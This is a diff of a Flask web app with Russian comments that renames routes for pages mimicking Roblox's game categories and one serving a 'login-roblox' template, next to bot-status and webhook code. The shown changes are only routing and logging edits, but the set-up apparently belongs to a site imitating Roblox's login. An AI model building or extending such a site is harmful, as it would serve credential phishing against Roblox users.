@@ -358,49 +358,40 @@ def check_bot_status():
 
 # Flask маршруты для HTML страниц
 @app.route('/')
-def index():
-    logger.info("Запрос на /")
+def home():
     return render_template('index.html')
 
 @app.route('/404')
 def not_found():
-    logger.info("Запрос на /404")
     return render_template('404.html')
 
-@app.route('/toptrending')
+@app.route('/top-trending')
 def top_trending():
-    logger.info("Запрос на /toptrending")
     return render_template('toptrending.html')
 
-@app.route('/login-roblox')
+@app.route('/login')
 def login_roblox():
-    logger.info("Запрос на /login-roblox")
     return render_template('login-roblox.html')
 
-@app.route('/index')
-def index_explicit():
-    logger.info("Запрос на /index")
-    return render_template('index.html')
-
-@app.route('/upandcoming')
+@app.route('/up-and-coming')
 def up_and_coming():
-    logger.info("Запрос на /upandcoming")
     return render_template('upandcoming.html')
 
-@app.route('/funwithfriends')
+@app.route('/fun-with-friends')
 def fun_with_friends():
-    logger.info("Запрос на /funwithfriends")
     return render_template('funwithfriends.html')
 
-@app.route('/hotrightnow')
+@app.route('/hot-right-now')
 def hot_right_now():
-    logger.info("Запрос на /hotrightnow")
     return render_template('hotrightnow.html')
 
-@app.route('/toprevisted')
+@app.route('/top-revisited')
 def top_revisited():
-    logger.info("Запрос на /toprevisted")
     return render_template('toprevisted.html')
+
+@app.errorhandler(404)
+def handle_404(e):
+    return render_template("404.html"), 404
 
 # Вебхук
 @app.route('/webhook', methods=['POST'])
